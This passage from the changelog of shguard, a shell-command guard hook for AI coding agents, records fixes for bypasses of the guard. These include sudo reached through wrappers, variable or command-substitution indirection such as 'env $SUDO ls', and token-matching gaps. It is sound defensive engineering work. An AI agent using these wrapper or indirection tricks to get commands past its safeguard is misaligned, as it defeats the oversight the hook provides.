  to load, because none of `except_targets`' alternatives cover the
  literal words "repo"/"delete". Same fail-closed consequence as the other
  entries above: the whole config is rejected, not just the offending
  rule.
- **Compatibility note**: a `required_tokens` entry with leading or
  trailing whitespace (e.g. `"delete "`) is now rejected at load time — it
  can never equal a resolved argv word, so it previously loaded and
  silently never matched. Internal whitespace stays legal (e.g. `"repo
  delete"` as one token, matching a quoted positional argument). Same
  fail-closed consequence as the entries above.

## [0.2.0] - 2026-07-21

- `sudo`-prefixed commands now floor to Ask on a blocklist miss instead of
  silently allowing, independent of whether the wrapped command trips its
  own rule (#32). This includes `sudo` reached through other wrappers
  (`env sudo ls`) and `sudo bash -c '<benign script>'`. The floor is not
  config-overridable: an `allow` entry for the wrapped command
  (`command = "gh"` vs `sudo gh pr view`) no longer clears it, and
  `command = "sudo"` allow entries were already rejected at load time.
- A transparent-wrapper chain whose wrapped command cannot be statically
  resolved (`env $(echo sudo) ls`, `env $SUDO ls` — at runtime these run
  whatever the substitution/variable holds, possibly `sudo`) now fails
  closed to Ask instead of allowing.
- Known limitation: a user `[[deny]] command = "sudo"` rule remains
  unreachable (rule matching resolves through `sudo` as a transparent
  wrapper), so the floor's Ask is the strictest sudo-wide posture
  expressible today; a config key to raise it to deny is tracked in
  [#35](https://github.com/tsukasaI/shguard/issues/35).

## [0.1.0] - 2026-07-20

Initial release.

- `PreToolUse` hook for AI coding agents that blocks dangerous shell
  commands via real tokenisation and static normalisation (parse →
  normalise → danger check → structural gate), not regex matching.
- Covers all GuardFall-catalog bypass classes plus two shguard-specific
  extensions (ANSI-C quoting, variable indirection); see the regression
  table in README.md.
- User-configurable command policy (deny/ask/allow) via `SHGUARD_CONFIG`.
- Ships as a single binary for macOS (aarch64, x86_64) and Linux
  (x86_64, aarch64), published via GitHub Releases and crates.io.

[0.4.1]: https://github.com/tsukasaI/shguard/releases/tag/v0.4.1
[0.2.0]: https://github.com/tsukasaI/shguard/releases/tag/v0.2.0
[0.1.0]: https://github.com/tsukasaI/shguard/releases/tag/v0.1.0
